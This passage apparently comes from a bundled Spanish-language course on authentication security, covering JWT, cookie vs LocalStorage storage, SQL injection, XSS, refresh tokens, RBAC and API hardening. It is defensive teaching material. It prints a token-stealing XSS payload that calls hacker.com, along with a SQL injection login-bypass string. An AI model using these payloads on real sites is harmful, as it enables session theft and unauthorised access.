**Por qu?** Si dices "El usuario no existe", le ests confirmando a un atacante que ese email no est en tu base de datos. Si dices "Contrasea incorrecta", le confirmas que el email S existe y ahora solo tiene que probar contraseas para esa cuenta. No le des pistas al enemigo.

## 4. Limitacin de Intentos (Rate Limiting)
Un hacker no va a probar 10 claves a mano. Va a usar un programa que pruebe 1,000 claves por segundo. 
Debes bloquear la IP o la cuenta si hay ms de 5 o 10 intentos fallidos en poco tiempo. Esto detiene los ataques de "fuerza bruta".

---

### Ejercicio Prctico 4:
Dibuja (en papel o mentalmente) un diagrama de flujo de qu pasa en el servidor cuando un usuario intenta loguearse. Incluye los caminos de "xito" y los diferentes "Errores".

*Reflexiona: Qu pasara si el servidor tarda mucho en comparar los hashes de las claves? Podra usarse esto para un ataque de denegacin de servicio (DoS)?*
`,completed:!1},{id:"auth-security-05-tokens",title:"Tokens (Autenticacin Moderna)",level:"junior",content:`# Leccin 5: Tokens (Autenticacin Moderna)

Las sesiones (basadas en Cookies) son geniales para sitios web tradicionales, pero tienen problemas cuando nuestra app empieza a crecer o queremos conectar apps mviles. Aqu es donde entran los **Tokens**.

## 1. Qu es un Token?
Imagina que vas a una feria. En la entrada pagas 10 dlares y te dan una pulsera de color con un sello. A partir de ah, para subirte a cualquier juego, ya no sacas tu billetera ni demuestras quin eres; solo muestras la pulsera. 
Esa pulsera es un **Token**.

En programacin, un token es una cadena de texto larga y aparentemente aleatoria que representa tu permiso para usar la aplicacin.

## 2. Stateless (Sin Estado) vs Stateful (Con Estado)
*   **Sesiones (Stateful):** El servidor tiene que recordar cada ID de sesin. Si tienes 1 milln de usuarios, necesitas una base de datos gigante solo para recordar quin est logueado.
*   **Tokens (Stateless):** El servidor **no guarda nada**. El token contiene toda la informacin necesaria (como tu ID de usuario y perfil). El servidor solo lo mira y verifica que el sello de seguridad (la firma) sea autntico.

## 3. Ventajas de los Tokens
1.  **Escalabilidad:** Como el servidor no guarda sesiones, puedes tener 100 servidores trabajando juntos y cualquiera de ellos sabr quin es el usuario con solo mirar el token.
2.  **Mobile Friendly:** Las apps de celular (iOS/Android) no manejan cookies tan fcilmente como los navegadores. Los tokens son su idioma natural.
3.  **Cross-Domain:** Puedes usar el mismo token para pedir datos a diferentes servicios (microservicios).

## 4. El peligro de los Tokens
A diferencia de las sesiones en el servidor, un token es difcil de "invalidar". Si el servidor no guarda una lista de quin est logueado, cmo le quitas el token a alguien antes de que expire? 
Es como si la pulsera de la feria no se pudiera romper. Quien la tenga, entra. Por eso los tokens suelen tener un tiempo de vida corto (expiracin).

---

### Ejemplo de un Token:
\`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ...\`
Parece basura, pero es informacin estructurada. Veremos exactamente qu es esto en la siguiente leccin.

### Ejercicio Mental 5:
Si ests haciendo una aplicacin que solo va a funcionar en un navegador web y no tienes planes de crecer mucho...
1.  Usaras Sesiones o Tokens?
2.  Por qu los tokens son los favoritos de las aplicaciones que usan Microservicios?
`,completed:!1},{id:"auth-security-06-jwt-conceptos",title:"JWT (JSON Web Tokens)",level:"junior",content:`# Leccin 6: JWT (JSON Web Tokens)

Si has escuchado hablar de autenticacin moderna, seguro escuchaste **JWT**. Es el estndar ms usado para tokens hoy en da. Vamos a desarmarlo para ver cmo funciona por dentro.

## 1. La Anatoma de un JWT
Un JWT se divide en tres partes separadas por puntos (\`.\`):
\`HEADER.PAYLOAD.SIGNATURE\`

### A. Header (Cabecera)
Contiene informacin sobre cmo se gener el token. Normalmente dice que es un JWT y qu algoritmo de firma se us (ej: HS256).

### B. Payload (Cuerpo)
Aqu estn los datos reales, llamados "Claims". Es un objeto JSON convertido a Base64.
Ejemplo:
\`\`\`json
{
  "userId": "123",
  "username": "octavio",
  "role": "admin",
  "exp": 1718923000
}
\`\`\`
**Importante:** Cualquier persona que tenga el token puede decodificarlo y leer esto. **NUNCA pongas contraseas u otros datos sensibles en el Payload.**

### C. Signature (Firma)
Es la parte ms importante. Se crea tomando el Header, el Payload y una **LLAVE SECRETA** que solo conoce tu servidor. 
Si alguien cambia aunque sea una letra del Payload (ej: cambia \`role: "user"\` por \`role: "admin"\`), la firma ya no coincidir y el servidor rechazar el token.

## 2. Decodificar vs Verificar
*   **Decodificar:** Es pasar de Base64 a texto legible. Cualquiera puede hacerlo (existen webs como \`jwt.io\`). Por eso no es un lugar secreto.
*   **Verificar:** Es asegurar que el contenido no fue alterado. Solo el servidor, que tiene la llave secreta, puede verificar que la firma es autntica.

## 3. Por qu es genial el JWT?
Porque permite que el servidor sea "ciego". No necesita buscar en la base de datos para saber quin eres. Mira el token, verifica la firma, y si est OK, confa plenamente en la informacin que est adentro.

## 4. Expiracin (\`exp\`)
Como no podemos borrar un JWT fcilmente del mundo una vez emitido, le ponemos una fecha de vencimiento. Cuando el servidor recibe un token, lo primero que hace (adems de ver la firma) es revisar si todava es vlido o si ya expir.

---

### Error de Seguridad Grave:
Usar una llave secreta dbil (ej: \`123456\`) para firmar tus JWT. Un hacker podra adivinarla y empezar a crear tokens falsos para tu aplicacin, dndose permisos de administrador a s mismo.

### Ejercicio Mental 6:
Copia el token de ejemplo de la leccin anterior y pgalo en [jwt.io](https://jwt.io).
1.  Qu informacin puedes ver en el Payload?
2.  Qu pasa si intentas cambiar el nombre del usuario en el editor de la izquierda de esa pgina? Sigue siendo vlida la firma?
`,completed:!1},{id:"auth-security-07-cookies-vs-localstorage",title:"Cookies vs LocalStorage (Dnde guardo el secreto?)",level:"junior",content:`# Leccin 7: Cookies vs LocalStorage (Dnde guardo el secreto?)

Una vez que el servidor te enva un token o un ID de sesin, el navegador tiene que guardarlo en algn lado para enviarlo en la siguiente peticin. Las dos opciones principales son **LocalStorage** y **Cookies**. 
Ninguna es perfecta; ambas tienen sus ataques enemigos.

## 1. LocalStorage
Es un almacn de datos fcil de usar para los programadores de Frontend con JavaScript (\`localStorage.setItem(...)\`).

*   **Pros:** Es muy sencillo de manejar. No tiene lmites de tamao pequeos.
*   **Contras (Ataque XSS):** Si un atacante logra inyectar UN script malicioso en tu web (por ejemplo, a travs de un comentario de un usuario), ese script puede leer TODO tu LocalStorage y enviarle tu token al hacker. JavaScript tiene acceso total.

## 2. Cookies
Son una tecnologa ms antigua pero diseada especficamente para la comunicacin servidor-cliente.

*   **Pros (HttpOnly):** Puedes configurar una cookie como \`HttpOnly\`. Esto significa que el navegador la enviar automticamente al servidor, pero **JavaScript NO puede leerla**. Esto te protege del ataque anterior (XSS).
*   **Contras (Ataque CSRF):** Como las cookies se envan automticamente, un atacante podra engaarte para que hagas clic en un link que haga una peticin a tu web bancaria (\`banco.com/enviar-dinero\`). Tu navegador enviar la cookie pensando que eres t quien hace la peticin.

## 3. Cul elegir?
La recomendacin de seguridad moderna para la mayora de las apps web es:
**USA COOKIES con los flags de seguridad activados:**
1.  **HttpOnly:** Nadie puede leerla con cdigo.
2.  **Secure:** Solo se enva por HTTPS (encriptado).
3.  **SameSite=Strict/Lax:** El navegador solo la enva si la peticin nace desde tu propio sitio, bloqueando el ataque CSRF.

## 4. Cundo usar LocalStorage entonces?
Para guardar cosas que no sean secretas: el tema de la web (claro/oscuro), el lenguaje preferido (espaol/ingls) o elementos del carrito de compras que no comprometan la seguridad.

---

### Ejemplo de configuracin de Cookie segura (en un Servidor):
\`\`\`javascript
res.cookie('token', tokenJWT, {
  httpOnly: true,
  secure: true, // Requiere HTTPS
  sameSite: 'Strict',
  maxAge: 3600000 // 1 hora
});
\`\`\`

### Ejercicio Mental 7:
Imagina que guardas el token de un usuario en \`LocalStorage\`. El usuario entra a un foro de tu web y ve un mensaje que dice: \`<script>fetch('https://hacker.com?token=' + localStorage.getItem('token'))<\/script>\`.
1.  Qu acaba de pasar con la seguridad de ese usuario?
2.  Cmo habra evitado esto el uso de una cookie \`HttpOnly\`?
`,completed:!1},{id:"auth-security-08-seguridad-basica",title:"Seguridad bsica (Tus defensas principales)",level:"junior",content:`# Leccin 8: Seguridad bsica (Tus defensas principales)

La autenticacin no es una isla. Por ms que tengas el mejor login del mundo, si tu servidor tiene grietas en otros lados, el hacker igual entrar. Veamos las defensas bsicas.

## 1. HTTPS (TLS/SSL) es Obligatorio
Si usas \`http://\` en lugar de \`https://\`, toda la informacin (incluyendo contraseas y tokens) viaja por internet en texto plano. Cualquiera que est en el mismo WiFi que el usuario puede ver su clave.
**En 2024, no desplegar con HTTPS es una negligencia profesional.**

## 2. SQL Injection (Inyeccin SQL)
Si tu cdigo hace algo como esto:
\`SELECT * FROM users WHERE email = '\` + emailIngresado + \`'\`
Un hacker podra ingresar como email: \`' OR 1=1 --\`
Y tu servidor ejecutara: \`SELECT * FROM users WHERE email = '' OR 1=1 --'\`
Esto hara que el login fuera exitoso sin siquiera saber el email ni la clave!
**Solucin:** Usa siempre "Queries Parametrizadas" o un ORM (como Mongoose o Sequelize) que ya te protegen de esto.

## 3. XSS (Cross-Site Scripting)
Lo vimos en la leccin anterior. Es cuando alguien logra ejecutar JavaScript en tu pgina.
**Solucin:** Escapar siempre los datos que el usuario ingresa antes de mostrarlos en pantalla. No confes en nada que venga de un formulario.

## 4. Rate Limiting y Brute Force
Ya lo mencionamos, pero vale la pena repetirlo. Tienes que limitar la velocidad. Si alguien pide 50 pginas por segundo desde la misma IP, probablemente sea un bot atacante o un scraper. Blquealo.

## 5. El principio de Menor Privilegio
Al programar tu backend para auth, asegrate de que el usuario de la base de datos que usa tu app solo tenga permisos de \`lectura\` y \`escritura\` en las tablas necesarias. No le des permisos de "Superusuario" de toda la base de datos a tu aplicacin web.

---

### Ejemplo de "Sanitizacin" simple:
Si un usuario intenta registrarse con el nombre: \`Juan <script>alert("hack")<\/script>\`, tu servidor debera transformar eso en \`Juan &lt;script&gt;...\` antes de guardarlo o mostrarlo. As el navegador lo mostrar como texto y no ejecutar el script.

### Ejercicio Mental 8:
Si tienes una app con Login perfecto pero no usas HTTPS:
1.  Qu pasa si el usuario se conecta desde el WiFi de un aeropuerto?
2.  Quines podran ver sus datos de acceso?
`,completed:!1},{id:"auth-security-09-buenas-practicas",title:"Buenas prcticas iniciales",level:"junior",content:`# Leccin 9: Buenas prcticas iniciales

Felicidades! Ya tienes una base slida. Para cerrar este nivel Junior de Autenticacin, repasemos las buenas prcticas que te separarn de un programador improvisado.

## 1. No reinventes la rueda (pero entiende cmo rueda)
Es genial que aprendas a hacer un login desde cero para entender los conceptos. Pero en produccin, usa libreras y estndares probados como **Passport.js**, **Auth0**, **NextAuth** o **Firebase Auth**. Estos servicios ya resolvieron miles de agujeros de seguridad que t an no conoces.

## 2. Implementa "Olvid mi contrasea" de forma segura
No enves la clave vieja por mail (recuerda que ni t la sabes porque est hasheada).
Enva un **link con un token temporal de un solo uso** que venza en 15 o 30 minutos. Al hacer clic, el usuario puede elegir una clave nueva.

## 3. Log Out de verdad
Asegrate de que cuando el usuario presiona "Cerrar sesin":
*   Se borre la cookie o el token del navegador.
*   (Si usas sesiones) Se invalide la sesin en el servidor.
*   Se redirija al usuario a la pgina de Home o Login para que no vea datos que quedaron "atrapados" en la memoria del Frontend.

## 4. Auditora bsica
Guarda un registro (logs) de quin entra y cundo. Pero, **CUIDADO!**, nunca pongas la contrasea en los logs de error del servidor. Muchos Juniors cometen el error de hacer: \`console.log(request.body)\` para debugear, y dejan las claves de sus usuarios escritas en archivos de texto planos en el servidor.

## 5. El futuro: MFA / 2FA
Una contrasea ya no es suficiente. Las buenas prcticas hoy sugieren pedir algo ms: un cdigo por app (Google Authenticator) o un email de confirmacin. Empieza a pensar cmo podras integrar esto en el futuro.

## 6. Password Complexity
No obligues a tus usuarios a usar algo imposible como "2 maysculas, 3 caracteres especiales y una runa antigua", porque terminarn anotndolo en un post-it pegado al monitor. Mejor, enfrate en que la clave sea **larga** (ms de 12 caracteres) o usa un medidor de fuerza visual para que el usuario sea consciente.

---

### Misin Final Junior:
Ya tienes las herramientas conceptuales. Tu prximo paso es tomar tu lenguaje de backend favorito (Node, Python, PHP, etc.) e intentar implementar un login que use:
1.  **Hashing** (con Sal) para guardar contraseas.
2.  **JWT o Cookies** para la sesin.
3.  **HTTPS** para el transporte.

La seguridad es un camino de aprendizaje constante, pero hoy has dado el paso ms importante! 
`,completed:!1,isProject:!0},{id:"auth-security-10-ejercicios-auth-junior",title:"Laboratorio de Autenticacin Junior",level:"junior",content:`# Prctica: Laboratorio de Autenticacin Junior

En este laboratorio aplicars los conceptos de seguridad en un entorno controlado. Los ejercicios estn diseados para realizarse en cualquier lenguaje de backend (Node.js, Python, PHP, Go, etc.).

---

## Ejercicio 1: El Guardian de Secretos (Hashing)
**Contexto:** Necesitas crear una funcin que reciba una contrasea en texto plano y devuelva su versin protegida.

**Consigna:**
1. Instala una librera de hashing confiable (ej: \`bcrypt\` o \`argon2\`).
2. Crea una funcin \`protegerClave(password)\` que:
   - Genere un **Salt**.
   - Devuelva el hash resultante.
3. Intenta pasar la misma palabra dos veces y observa si el resultado es idntico o diferente.

**Resultado esperado:** Al llamar a la funcin con "123456", debes obtener una cadena larga que comience con el identificador del algoritmo (ej: \`$2b$...\`) y que cambie en cada ejecucin debido al Salt.

---

## Ejercicio 2: Registro de Usuario Seguro
**Contexto:** Ests programando el endpoint \`/register\`.

**Consigna:**
1. Crea un array vaco llamado \`usuariosDB\` para simular una base de datos.
2. Crea una funcin de registro que:
   - Reciba \`email\` y \`password\`.
   - Valide que el email no est en \`usuariosDB\`.
   - Hashee la contrasea (usando el ejercicio anterior).
   - Guarde un objeto con \`{ email, passwordHash }\` en el array.
3. **Desafo:** Asegrate de que no se guarde el campo \`password\` original por error.

**Resultado esperado:** Al registrar dos usuarios, el array \`usuariosDB\` debe contener dos objetos donde la contrasea sea ilegible.

---

## Ejercicio 3: El Portero (Login Bsico)
**Contexto:** Ahora el usuario quiere entrar. Tienes que comparar lo que l escribe con lo que guardaste.

**Consigna:**
1. Crea una funcin \`login(email, password)\` que:
   - Busque al usuario en \`usuariosDB\`.
   - Si no existe, devuelva "Credenciales invlidas".
   - Si existe, use la funcin \`compare\` de tu librera de hashing para verificar la clave.
2. **Importante:** Usa el mismo mensaje de error tanto si falla el email como si falla la clave.

**Resultado esperado:** 
- Email correcto + Clave correcta -> "Acceso Concedido".
- Email correcto + Clave mal -> "Credenciales invlidas".
- Email que no existe -> "Credenciales invlidas".

---

## Ejercicio 4: Firma de Pasaporte (Generacin de JWT)
**Contexto:** Si el login es exitoso, no queremos que el usuario nos mande su clave otra vez. Vamos a darle un JWT.

**Consigna:**
1. Instala una librera de JWT (ej: \`jsonwebtoken\` en Node).
2. Modifica el login para que, si el acceso es concedido, genere un token que contenga:
   - \`id\` del usuario.
   - \`rol\` (por defecto "user").
   - Expiracin de 1 hora.
3. Usa una "Secret Key" de al menos 32 caracteres.

**Resultado esperado:** El login ya no devuelve un mensaje de texto, sino un String largo dividido en 3 partes por puntos.

---

## Ejercicio 5: Zona Vip (Proteccin de Rutas)
**Contexto:** Tienes una ruta sensible llamada \`/perfil\` que solo debe ver el dueo de la cuenta.

**Consigna:**
1. Crea una funcin (middleware) que:
   - Lea el token que viene en los encabezados de la peticin (\`Authorization: Bearer <token>\`).
   - Verifique si el token es vlido y no ha expirado.
   - Si es vlido, deje pasar la peticin.
   - Si es invlido o no existe, devuelva un error 401 (No autorizado).

**Resultado esperado:** 
- Peticin sin token a \`/perfil\` -> Bloqueada.
- Peticin con token alterado -> Bloqueada.
- Peticin con token real -> Muestra los datos del perfil.

---

Excelente trabajo! Has completado el circuito bsico de seguridad que toda aplicacin moderna requiere. 
`,completed:!1,isProject:!0},{id:"auth-security-11-refresh-tokens",title:"Refresh Tokens y Rotacin",level:"semi-senior",content:'# Leccin 11: Refresh Tokens y Rotacin\n\nEn el nivel Junior aprendiste que los JWT deben tener una expiracin corta para ser seguros. Pero, qu pasa cuando el token de un usuario expira? Le pedimos que haga login de nuevo cada 15 minutos? No. Para eso existen los **Refresh Tokens**.\n\n## 1. El problema del JWT de larga duracin\n*   **Incorrecto:** Crear un Access Token que dure 1 ao. Si ese token es robado, el atacante tiene acceso por un ao y no puedes revocarlo fcilmente.\n*   **Correcto:** Crear un Access Token de 15 minutos y un Refresh Token de 7 das.\n\n## 2. El flujo del Refresh Token\n1.  **Login:** El servidor devuelve dos tokens: `accessToken` (corto) y `refreshToken` (largo).\n2.  **Uso:** El frontend usa el `accessToken` para todas las peticiones.\n3.  **Expiracin:** Cuando el `accessToken` expira (error 401), el frontend no desloguea al usuario. Enva el `refreshToken` a un endpoint especial (ej: `/refresh`).\n4.  **Renovacin:** El servidor valida el `refreshToken` contra la base de datos. Si es vlido, emite un NUEVO `accessToken`.\n\n## 3. Rotacin de Refresh Tokens (RTR)\nEsta es una prctica de nivel Semi-Senior. Cada vez que el usuario usa un `refreshToken` para pedir un nuevo `accessToken`, el servidor tambin le da un NUEVO `refreshToken` e invalida el anterior.\n\n**Por qu?** Si un atacante rob el `refreshToken` y lo usa, y luego el usuario legtimo lo usa, el servidor detectar que se intent usar un token ya invalidado (reutilizacin) y **bloquear todas las sesiones de ese usuario** inmediatamente, asumiendo un robo.\n\n## 4. Dnde guardar el Refresh Token?\n*   **Access Token:** Puede ir en memoria (estado de React/Vue).\n*   **Refresh Token:** DEBE ir en una **Cookie HttpOnly, Secure e inalcanzable por JS**, dirigida solo al endpoint de `/refresh`.\n\n---\n\n### Caso Real de Error:\nUn programador guarda el `refreshToken` en `LocalStorage`. Un script XSS roba el token. Como el token dura 1 mes, el hacker tiene acceso persistente y el usuario nunca se entera, porque el hacker puede seguir refrescando el acceso sin contrasea.\n\n### Ejercicio Prctico 11:\nDisea el esquema de base de datos para los Refresh Tokens. Qu campos necesitaras para poder revocar un token especfico (por ejemplo, si el usuario dice "me robaron el celular")?\nPista: `userId`, `tokenHash`, `expiresAt`, `revoked`.\n',completed:!1},{id:"auth-security-12-roles-y-permisos",title:"Roles y Permisos (RBAC vs ABAC)",level:"semi-senior",content:`# Leccin 12: Roles y Permisos (RBAC vs ABAC)

Saber quin es el usuario no es suficiente. Debemos saber qu puede hacer. En el nivel Semi-Senior implementamos sistemas de control de acceso granulares.

## 1. RBAC (Role-Based Access Control)
Es el sistema ms comn. Asignas **Roles** a usuarios y **Permisos** a roles.

*   **Usuario:** \`Juan\`
*   **Rol:** \`Editor\`
*   **Permisos del Rol Editor:** \`crear_post\`, \`editar_post\`, \`ver_borradores\`.

**Comparacin Incorrecto vs Correcto:**
*   **Incorrecto:** \`if (user.role === 'admin') { ... }\` esparcido por todo el cdigo. Si maana quieres agregar un rol "SuperAdmin", tienes que cambiar 50 archivos.
*   **Correcto:** \`if (user.can('delete_post')) { ... }\`. No importa qu rol tenga Juan, solo importa si ese rol tiene el permiso necesario.

## 2. ABAC (Attribute-Based Access Control)
Para sistemas complejos donde los roles no alcanzan. Se basa en atributos del usuario, el recurso y el entorno.

**Ejemplo:** *"Un profesor puede editar un examen solo si pertenece a su ctedra y es antes de las 18:00hs"*. Aqu el permiso depende del contexto, no solo del rol.

## 3. Jerarqua de Roles
Un administrador debera poder hacer todo lo que hace un editor, ms sus propias tareas. No dupliques permisos; haz que los roles hereden de otros.

## 4. Middleware de Autorizacin
No valides permisos dentro del controlador (lgica de negocio). Hazlo antes, en una capa separada.

\`\`\`javascript
// Ejemplo conceptual en Node
router.delete('/post/:id', 
  isAuthenticated, 
  hasPermission('delete_post'), 
  deletePostController
);
\`\`\`

---

### Caso Real de Error:
Un sistema de e-commerce permita borrar productos a cualquiera que enviara una peticin \`DELETE\` a \`/api/products/123\`. El programador se olvid de poner el middleware de \`isAdmin\` en esa ruta especfica. Resultado: Un bot borr todo el catlogo de la tienda en 5 minutos.

### Ejercicio Prctico 12:
Imagina una aplicacin de Hospital. Define 3 roles y al menos 2 permisos por cada uno. Cmo manejaras el permiso especial de un mdico que solo puede ver las historias clnicas de SUS pacientes (y no de todos)?
`,completed:!1},{id:"auth-security-13-sesiones-avanzadas",title:"Manejo de Sesiones Avanzado y Revocacin",level:"semi-senior",content:`# Leccin 13: Manejo de Sesiones Avanzado y Revocacin

Como Semi-Senior, debes preocuparte por la escalabilidad y el control absoluto sobre quin est conectado. Los JWT son geniales porque son "stateless", pero su mayor debilidad es la revocacin inmediata.

## 1. El dilema del "Baneo"
Si emites un JWT vlido por 2 horas a un usuario y luego lo bloqueas en tu base de datos por mal comportamiento, el usuario **seguir teniendo acceso** hasta que su token expire. El servidor no sabe que el token ya no es bienvenido porque no guarda estado.

## 2. Solucin: La Lista Negra (Blacklist) con Redis
Para mantener la escalabilidad de los tokens pero ganar control, usamos una base de datos en memoria ultra rpida como **Redis**.

1.  Cuando un usuario hace Logout o es bloqueado, guardamos el \`jti\` (ID nico del token) en Redis con el tiempo que le queda de vida.
2.  En cada peticin, el middleware verifica si el token est en la lista negra.
3.  Redis borra automticamente el token de la lista cuando su tiempo expira.

## 3. Sesiones Hbridas (Database-backed JWT)
Otra opcin es guardar el "Estado de la Sesin" en la DB pero enviar el ID va JWT. 
Esto permite:
*   Ver todos los dispositivos conectados de un usuario.
*   "Cerrar sesin en todos los dispositivos".
*   Forzar un cambio de contrasea y desloguear a todos.

## 4. Comparacin: Session Cookies vs JWT
| Caracterstica | Sessions (Redis/DB) | JWT (Stateless) |
| :--- | :--- | :--- |
| **Revocacin** | Instantnea y fcil | Difcil (requiere blacklist) |
| **Escalabilidad** | Media (requiere DB central) | Alta (no requiere DB) |
| **Info Adicional** | Solo el ID | Puede llevar roles, nombre, etc. |

---

### Escenario de Uso Real:
Un usuario reporta que su cuenta fue hackeada. Como Semi-Senior, tu sistema debe ser capaz de invalidar TODOS los tokens activos de ese usuario con un solo clic en el panel de soporte, sin esperar a que expiren.

### Ejercicio Prctico 13:
Si usas un sistema de Blacklist en Redis para invalidar tokens, cul sera el impacto en la latencia de tu API? Sigue siendo ms rpido que consultar una base de datos SQL tradicional en cada peticin? Justifica por qu Redis es la herramienta elegida aqu.
`,completed:!1},{id:"auth-security-14-seguridad-api",title:"Seguridad en APIs (Protegiendo la puerta trasera)",level:"semi-senior",content:`# Leccin 14: Seguridad en APIs (Protegiendo la puerta trasera)

Exponer una API es como dejar una ventana abierta. Un Semi-Senior no solo protege el login, sino que asegura que la API entera sea resiliente a ataques comunes.

## 1. OWASP Top 10 (Vulnerabilidades ms comunes)
Debes conocer estas tres por sobre todas:
1.  **Broken Object Level Authorization (BOLA):** Un usuario pide \`/api/orders/500\`. Logueado como el usuario 2, cambia la URL a \`/api/orders/501\` y puede ver el pedido de otra persona.
    *   **Solucin:** Siempre filtrar por \`ownerId\`: \`SELECT * FROM orders WHERE id = 501 AND user_id = current_user.id\`.
2.  **Excessive Data Exposure:** La API devuelve TODO el objeto del usuario (incluyendo password hash o datos privados) y el frontend solo muestra el nombre.
    *   **Solucin:** Usa DTOs (Data Transfer Objects) o transformadores para enviar solo lo estrictamente necesario.
3.  **Mass Assignment:** El usuario enva en el registro: \`{ "email": "a@b.com", "role": "admin" }\`. Si el servidor guarda todo el objeto sin filtrar, el usuario se hizo administrador solo.

## 2. Rate Limiting Avanzado
No bloquees solo por IP (muchos usuarios pueden compartir una IP pblica, como en una oficina).
*   **Mejor:** Limita por Usuario Logueado (ID).
*   **Diferenciado:** Los usuarios gratuitos tienen 10 peticiones/min, los Premium tienen 100/min.

## 3. Seguridad de los Headers
Agrega capas de seguridad con encabezados HTTP:
*   **Helmet.js (para Node):** Una librera que configura automticamente headers como \`X-Content-Type-Options: nosniff\` (evita que el navegador adivine el tipo de archivo) y \`Content-Security-Policy\` (CSP) para evitar scripts maliciosos.

## 4. CORS (Cross-Origin Resource Sharing)
No uses \`Access-Control-Allow-Origin: *\` en produccin. Define una lista blanca exacta de qu dominios pueden hablar con tu API.

---

### Caso Real de Error:
Una app de citas permita ver la ubicacin exacta de los usuarios. La API devolva la latitud y longitud con 6 decimales. Aunque el mapa mostraba un rea general, un hacker consumi la API directamente y pudo localizar a cualquier persona con un margen de error de un metro.

### Ejercicio Prctico 14:
Analiza el endpoint \`/api/user/update-profile\`. Recibe un objeto JSON con los cambios. Cmo evitaras que un usuario cambie su campo \`balance\` (dinero en cuenta) enviando \`{ "balance": 99999 }\` en la peticin de actualizacin de su nombre?
`,completed:!1},{id:"auth-security-15-auth-spa-errores",title:"Auth en SPAs y Manejo de Errores de Seguridad",level:"semi-senior",content:`# Leccin 15: Auth en SPAs y Manejo de Errores de Seguridad

En las aplicaciones de una sola pgina (React, Next.js, Vue), el manejo de la autenticacin tiene desafos nicos de UX y seguridad.

## 1. El flujo de Login en una SPA
A diferencia de una web vieja donde el servidor te rediriga, en una SPA el estado se maneja en el cliente.
1.  **Login:** El frontend enva datos y recibe una Cookie HttpOnly (Recomendado) o un Access Token.
2.  **Estado:** Guardamos en el estado global (Redux, Context, Pinia) que el usuario est \`isLoggedIn: true\`.
3.  **Persistencia:** Al recargar la pgina, el frontend debe verificar inmediatamente si la sesin sigue siendo vlida llamando a un endpoint \`/api/me\`.

## 2. Manejo de Errores "Silenciosos"
Un Semi-Senior sabe que los errores de auth deben manejarse con elegancia.
*   **401 Unauthorized:** El usuario no est logueado o su token expir. El frontend debe intentar un \`/refresh\` automticamente antes de echar al usuario al Login.
*   **403 Forbidden:** El usuario est logueado pero **no tiene permiso**. No lo mandes al Login, mustrale una pantalla de "No tienes permisos de administrador".

## 3. Seguridad en el Manejo de Errores
Cuidado con los mensajes de error del servidor.
*   **Incorrecto:** \`Error: Internal Server Error. Database table 'users' not found.\` (Fuga de informacin de la estructura del servidor).
*   **Correcto:** \`Error: No se pudo procesar la solicitud. Contacte a soporte (Ref ID: 550e).\` Registra el error real en tus logs privados, no lo enves al navegador.

## 4. Auditora de Seguridad (Logs)
Debes registrar eventos crticos para detectar ataques:
*   Login exitoso y fallido (con IP).
*   Cambios de contrasea.
*   Cambios en permisos de administrador.
*   Uso de tokens revocados.

---

### Casos de Error en SPAs:
Un programador guarda el estado de "Administrador" solo en el frontend (\`isAdmin = true\`). Un usuario abre la consola del navegador, cambia esa variable manualmente y desbloquea el botn de "Borrar Todo". Si el backend no vuelve a validar el permiso al recibir el clic, el sistema ha fallado.

### Ejercicio Prctico 15:
Imagina que el token del usuario expira mientras est completando un formulario muy largo. 
1. Cmo disearas el flujo para que el usuario no pierda lo que escribi? 
2. Cmo haras el "Silent Refresh" para que el usuario ni siquiera sepa que su token expir?
`,completed:!1},{id:"auth-security-16-ejercicios-auth-semi-senior",title:"Autenticacin Semi-Senior",level:"semi-senior",content:`# Ejercicios Tcnicos: Autenticacin Semi-Senior

Desafa tus conocimientos aplicando soluciones robustas a problemas de la vida real.

---

## Ejercicio 1: El Middleware de Autorizacin Universal
**Contexto:** Tienes una API con muchos roles (User, Editor, Admin, Moderator).
**Consigna:**
*   Escribe una funcin (middleware) que acepte una lista de permisos requeridos.
*   La funcin debe leer los permisos del usuario desde su token o sesin.
*   Si el usuario tiene AL MENOS UNO de los permisos requeridos, deja pasar.
*   Si no, devuelve un error 403 con un mensaje claro.

**Resultado esperado:** Poder usarlo as: \`router.post('/noticia', hasPermissions(['create_post', 'admin']), controller)\`.

---

## Ejercicio 2: Flujo de Recuperacin (Password Reset)
**Contexto:** Un usuario olvid su clave.
**Consigna:** Describe el flujo de base de datos para generar un token de reset seguro.
1. Cmo guardas el token en la DB? (Texto plano o hash?).
2. Cmo aseguras que el token solo sirva una vez?
3. Cmo aseguras que el token expire en 30 minutos?
4. Escribe el algoritmo lgico (pasos) para el endpoint \`/api/reset-password\` que recibe el token y la nueva clave.

---

## Ejercicio 3: Prevencin de BOLA (Broken Object Level Auth)
**Contexto:** Endpoint \`GET /api/facturas/:id\`.
**Consigna:** 
*   Escribe la lgica necesaria para evitar que el \`Usuario A\` vea la factura del \`Usuario B\` simplemente cambiando el ID en la URL.
*   Qu pasa si el \`Usuario A\` es un \`Administrador\`? Cmo cambia tu lgica?

---

## Ejercicio 4: Silent Refresh con Interceptor
**Contexto:** El Access Token del usuario dura 5 minutos.
**Consigna:** 
*   Escribe el pseudocdigo para un "Interceptor" de Axios (o Fetch) en el frontend.
*   Si una peticin recibe un error 401, el interceptor debe "pausar" las peticiones futuras, llamar a \`/api/refresh\`, actualizar el token y re-intentar la peticin original.

---

A resolver! Un profesional Semi-Senior se destaca por el manejo de casos de borde y situaciones de error. 
`,completed:!1,isProject:!0},{id:"auth-security-17-oauth-oidc",title:"OAuth 2.0 y OpenID Connect (OIDC)",level:"senior",content:`# Leccin 17: OAuth 2.0 y OpenID Connect (OIDC)

Como Arquitecto Senior, ya no diseas solo un "login", diseas un ecosistema de identidad. OAuth 2.0 y OIDC son los estndares que permiten que las aplicaciones confen entre s sin compartir contraseas.

## 1. El gran malentendido: OAuth vs OIDC
Es comn escuchar que se usan indistintamente, pero sus propsitos son diferentes:
*   **OAuth 2.0 (Delegacin de Autorizacin):** Permite que una aplicacin acceda a recursos en nombre de un usuario. Es el protocolo de la "Llave de Valet". Me das permiso para estacionar tu auto, pero no para entrar a tu casa.
*   **OpenID Connect (Capa de Identidad):** Es una capa construida sobre OAuth 2.0 que aade la **Autenticacin**. Proporciona el "ID Card" del usuario (el ID Token).

## 2. Los Flujos (Grant Types) que debes dominar
En produccin, no todos los flujos son seguros.
*   **Authorization Code Flow with PKCE:** El estndar de oro para SPAs y Apps mviles. Evita que un atacante intercepte el cdigo de autorizacin.
*   **Client Credentials:** Para comunicacin Machine-to-Machine (M2M) entre microservicios.
*   **Implicit Flow:** **OBSOLETO.** No lo uses en nuevos desarrollos debido a fallos de seguridad en la entrega del token por URL.

## 3. Roles en OAuth 2.0
